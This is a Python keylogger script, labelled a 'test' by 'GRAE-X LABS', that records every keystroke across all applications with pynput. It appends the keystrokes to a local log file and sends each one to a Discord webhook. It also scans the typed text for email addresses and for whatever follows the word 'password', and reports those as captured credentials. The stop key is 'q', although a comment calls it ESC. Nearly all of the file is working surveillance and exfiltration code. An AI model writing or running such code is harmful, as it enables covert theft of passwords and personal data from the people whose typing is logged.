# GRAE-X LABS - TEST KEYLOGGER WITH VISIBLE OUTPUT
# This WILL show what's happening

import sys
import os
import time
from datetime import datetime

print("=== GRAE-X LABS TEST KEYLOGGER ===")
print("Starting at:", datetime.now())
print("=" * 40)

# Your Discord webhook - MAKE SURE TO SET THIS!
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ACTUAL_WEBHOOK_HERE"

def log_message(message):
    """Log with multiple methods so we SEE what's happening"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    full_message = f"[{timestamp}] {message}"
    
    # 1. Print to console (ALWAYS WORKS)
    print(full_message)
    
    # 2. Write to local file
    try:
        with open("TEST_LOG.txt", "a", encoding="utf-8") as f:
            f.write(full_message + "\n")
    except Exception as e:
        print(f"File write error: {e}")
    
    # 3. Try Discord
    try:
        import requests
        payload = {"content": f"🔧 {message}", "username": "Test Monitor"}
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
        print(f"[{timestamp}] ✅ Sent to Discord")
    except Exception as e:
        print(f"[{timestamp}] ❌ Discord failed: {e}")

def main():
    print("🚀 INITIALIZING KEYLOGGER...")
    
    # Test basic functionality
    log_message("🟢 TEST: Application started successfully")
    log_message(f"🔧 TEST: Python version {sys.version}")
    log_message(f"🔧 TEST: Platform {sys.platform}")
    
    # Try to import pynput
    try:
        from pynput import keyboard
        log_message("✅ SUCCESS: pynput imported")
    except ImportError as e:
        log_message(f"❌ FAILED: pynput import - {e}")
        return
    
    # Try to import requests
    try:
        import requests
        log_message("✅ SUCCESS: requests imported")
    except ImportError as e:
        log_message(f"❌ FAILED: requests import - {e}")
    
    # Initialize keylogger
    buffer = ""
    key_count = 0
    
    def on_press(key):
        nonlocal buffer, key_count
        key_count += 1
        
        try:
            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            
            # Handle key press
            if hasattr(key, 'char') and key.char:
                char = key.char
                buffer += char
                log_message(f"KEY: '{char}' | Buffer: '{buffer[-20:]}'")
            else:
                key_name = str(key)
                if 'Key.space' in key_name:
                    buffer += " "
                    log_message("KEY: [SPACE]")
                elif 'Key.enter' in key_name:
                    buffer += "\n"
                    log_message("KEY: [ENTER]")
                elif 'Key.backspace' in key_name:
                    buffer = buffer[:-1] if buffer else ""
                    log_message("KEY: [BACKSPACE]")
                else:
                    log_message(f"KEY: {key_name}")
            
            # Check for patterns
            if '@' in buffer and '.' in buffer:
                for word in buffer.split():
                    if '@' in word and '.' in word:
                        log_message(f"🚨 EMAIL DETECTED: {word}")
                        buffer = buffer.replace(word, "")
            
            if 'password' in buffer.lower():
                idx = buffer.lower().find('password')
                if len(buffer) > idx + 8:
                    text = buffer[idx+8:idx+30]
                    log_message(f"🔑 PASSWORD FIELD: {text}")
            
            # Clean buffer
            if len(buffer) > 100:
                buffer = buffer[-50:]
                
        except Exception as e:
            log_message(f"❌ Key error: {e}")
        
        return True
    
    def on_release(key):
        # Stop on ESC for testing
        if hasattr(key, 'char') and key.char == 'q':
            log_message("🛑 Stopping (Q pressed)")
            return False
        return True
    
    # Start listening
    log_message("🎯 Starting keyboard listener...")
    log_message("💡 Type something in any application!")
    log_message("⏹️  Press 'Q' to stop")
    
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        log_message(f"❌ Listener error: {e}")
    
    log_message(f"📊 Session ended. Total keys: {key_count}")

if __name__ == "__main__":
    main()
    print("\n" + "=" * 40)
    print("TEST COMPLETE - Check TEST_LOG.txt")
    input("Press Enter to exit...")